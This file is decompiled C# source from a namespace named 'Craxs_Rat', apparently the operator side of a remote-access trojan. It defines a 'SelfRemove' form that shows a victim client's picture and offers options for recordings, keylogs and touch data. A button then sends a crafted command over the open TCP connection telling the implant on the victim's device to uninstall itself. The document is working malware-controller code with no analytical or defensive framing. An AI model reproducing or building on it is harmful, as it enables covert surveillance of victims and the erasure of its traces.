using System;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000CD RID: 205
	[DesignerGenerated]
	public partial class SelfRemove : Form
	{
		// Token: 0x06000F41 RID: 3905 RVA: 0x000A1124 File Offset: 0x0009F324
		public SelfRemove()
		{
			base.Load += this.SelfRemove_Load;
			this.InitializeComponent();
		}

		// Token: 0x17000483 RID: 1155
		// (get) Token: 0x06000F44 RID: 3908 RVA: 0x00006D54 File Offset: 0x00004F54
		// (set) Token: 0x06000F45 RID: 3909 RVA: 0x000A1884 File Offset: 0x0009FA84
		internal virtual Label Label34 { get; set; }

		// Token: 0x17000484 RID: 1156
		// (get) Token: 0x06000F46 RID: 3910 RVA: 0x00006D5C File Offset: 0x00004F5C
		// (set) Token: 0x06000F47 RID: 3911 RVA: 0x000A1898 File Offset: 0x0009FA98
		internal virtual Label Label1 { get; set; }

		// Token: 0x17000485 RID: 1157
		// (get) Token: 0x06000F48 RID: 3912 RVA: 0x00006D64 File Offset: 0x00004F64
		// (set) Token: 0x06000F49 RID: 3913 RVA: 0x000A18AC File Offset: 0x0009FAAC
		internal virtual Label Label2 { get; set; }

		// Token: 0x17000486 RID: 1158
		// (get) Token: 0x06000F4A RID: 3914 RVA: 0x00006D6C File Offset: 0x00004F6C
		// (set) Token: 0x06000F4B RID: 3915 RVA: 0x000A18C0 File Offset: 0x0009FAC0
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000487 RID: 1159
		// (get) Token: 0x06000F4C RID: 3916 RVA: 0x00006D74 File Offset: 0x00004F74
		// (set) Token: 0x06000F4D RID: 3917 RVA: 0x000A1904 File Offset: 0x0009FB04
		internal virtual PictureBox clientpic { get; set; }

		// Token: 0x17000488 RID: 1160
		// (get) Token: 0x06000F4E RID: 3918 RVA: 0x00006D7C File Offset: 0x00004F7C
		// (set) Token: 0x06000F4F RID: 3919 RVA: 0x000A1918 File Offset: 0x0009FB18
		internal virtual DrakeUICheckBox checkrecords { get; set; }

		// Token: 0x17000489 RID: 1161
		// (get) Token: 0x06000F50 RID: 3920 RVA: 0x00006D84 File Offset: 0x00004F84
		// (set) Token: 0x06000F51 RID: 3921 RVA: 0x000A192C File Offset: 0x0009FB2C
		internal virtual DrakeUICheckBox checkkeylogs { get; set; }

		// Token: 0x1700048A RID: 1162
		// (get) Token: 0x06000F52 RID: 3922 RVA: 0x00006D8C File Offset: 0x00004F8C
		// (set) Token: 0x06000F53 RID: 3923 RVA: 0x000A1940 File Offset: 0x0009FB40
		internal virtual DrakeUICheckBox checktouch { get; set; }

		// Token: 0x06000F54 RID: 3924 RVA: 0x000A1954 File Offset: 0x0009FB54
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			MsgBoxResult msgBoxResult = Interaction.MsgBox("The App will be uninstalled . and client won't come back\r\nAre you sure you want to Continue", MsgBoxStyle.YesNo, "Alert");
			if (msgBoxResult != MsgBoxResult.Yes)
			{
				if (msgBoxResult != MsgBoxResult.No)
				{
				}
			}
			else
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				int value = 0;
				int value2 = 0;
				string text = "";
				if (this.checkrecords.Checked)
				{
					text += "_RE_";
				}
				if (this.checkkeylogs.Checked)
				{
					text += "_FK_";
				}
				if (this.checktouch.Checked)
				{
					text += "_TH_";
				}
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"SFD<*>SLF",
						text,
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(value),
						GClass9.string_0,
						Conversions.ToString(value2),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000F55 RID: 3925 RVA: 0x000A1AE8 File Offset: 0x0009FCE8
		private void SelfRemove_Load(object sender, EventArgs e)
		{
			this.clientpic.Image = (Image)this.gclass8_0.objects_1[0];
		}

		// Token: 0x0400086B RID: 2155
		public GClass8 gclass8_0;
	}
}
